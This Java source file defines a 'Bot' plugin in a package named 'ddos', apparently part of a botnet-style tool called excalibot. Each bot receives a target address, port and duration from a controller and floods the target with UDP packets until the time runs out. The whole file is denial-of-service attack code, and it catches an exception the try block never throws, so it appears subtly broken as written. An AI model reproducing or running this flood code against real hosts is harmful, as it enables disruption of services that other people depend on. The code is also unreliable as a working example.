package org.powertrip.excalibot.common.plugins.ddos;

import org.powertrip.excalibot.common.com.SubTask;
import org.powertrip.excalibot.common.plugins.KnightPlug;
import org.powertrip.excalibot.common.plugins.interfaces.knight.ResultManagerInterface;

import java.io.IOException;
import java.net.*;

public class Bot extends KnightPlug{
	public Bot(ResultManagerInterface resultManager) {
		super(resultManager);
	}

	@Override
	public boolean run(SubTask subTask) {
		String address = subTask.getParameter("address");
		int port = Integer.parseInt(subTask.getParameter("port"));
		int time = Integer.parseInt(subTask.getParameter("time"));
		int botId = Integer.parseInt(subTask.getParameter("botId"));

		byte[] packet = new byte[1];


		try {
			DatagramSocket socket = new DatagramSocket();
			socket.connect(new InetSocketAddress(address, port));

			long end = System.currentTimeMillis() + time * 1000;
			while (System.currentTimeMillis() < end) {
				socket.send(new DatagramPacket(packet, packet.length));
			}

			resultManager.returnResult(
					subTask.createResult()
							.setSuccessful(true)
							.setResponse("finished", String.valueOf(botId))
			);


		} catch (UnknownHostException e) {
			return false;
		} catch (SocketException e) {
			return false;
		} catch (IOException e) {
			return false;
		} catch (InterruptedException e) {
			return false;
		}

		return true;

	}
}
